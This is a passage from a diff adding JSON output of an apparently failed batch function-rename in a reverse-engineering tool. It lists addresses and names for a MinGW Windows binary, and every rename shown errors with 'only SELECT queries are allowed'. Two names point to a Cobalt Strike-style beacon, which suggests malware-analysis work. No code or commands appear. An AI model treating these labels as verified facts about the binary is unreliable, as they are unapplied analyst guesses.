+      {
+        "address": "5368717712",
+        "name": "___w64_mingwthr_add_key_dtor",
+        "error": "only SELECT queries are allowed"
+      },
+      {
+        "address": "5368718944",
+        "name": "_is_nonwritable_in_current_image",
+        "error": "only SELECT queries are allowed"
+      },
+      {
+        "address": "5368719088",
+        "name": "enum_import_library_names",
+        "error": "only SELECT queries are allowed"
+      },
+      {
+        "address": "5368715760",
+        "name": "_matherr",
+        "error": "only SELECT queries are allowed"
+      },
+      {
+        "address": "5368718032",
+        "name": "__mingw_tls_callback",
+        "error": "only SELECT queries are allowed"
+      },
+      {
+        "address": "5368714576",
+        "name": "cobalt_beacon_inject_and_cleanup",
+        "error": "only SELECT queries are allowed"
+      },
+      {
+        "address": "5368719616",
+        "name": "_amsg_exit",
+        "error": "only SELECT queries are allowed"
+      },
+      {
+        "address": "5368716016",
+        "name": "__mingw_mark_section_writable",
+        "error": "only SELECT queries are allowed"
+      },
+      {
+        "address": "5368715616",
+        "name": "mingw_tls_process_attach_callback",
+        "error": "only SELECT queries are allowed"
+      },
+      {
+        "address": "5368715584",
+        "name": "min_gw_tls_callback_wrapper",
+        "error": "only SELECT queries are allowed"
+      },
+      {
+        "address": "5368720352",
+        "name": "cobalt_beacon_main",
+        "error": "only SELECT queries are allowed"
+      },
+      {
+        "address": "5368716112",
+        "name": "ensure_target_section_writable",
+        "error": "only SELECT queries are allowed"
+      },
+      {
+        "address": "5368716480",
+        "name": "_pei386_runtime_relocator",
+        "error": "only SELECT queries are allowed"
+      },
+      {
+        "address": "5368713280",
+        "name": "__tmainCRTStartup",
+        "error": "only SELECT queries are allowed"
+      },
+      {
+        "address": "5368714304",
+        "name": "win_main_crt_startup",
+        "error": "only SELECT queries are allowed"
+      },
+      {
+        "address": "5368714336",
+        "name": "main_crt_startup",
+        "error": "only SELECT queries are allowed"
+      }
+    ],
+    "applied_count": 0,
+    "skipped_count": 0,
+    "error_count": 18
+  }
+}
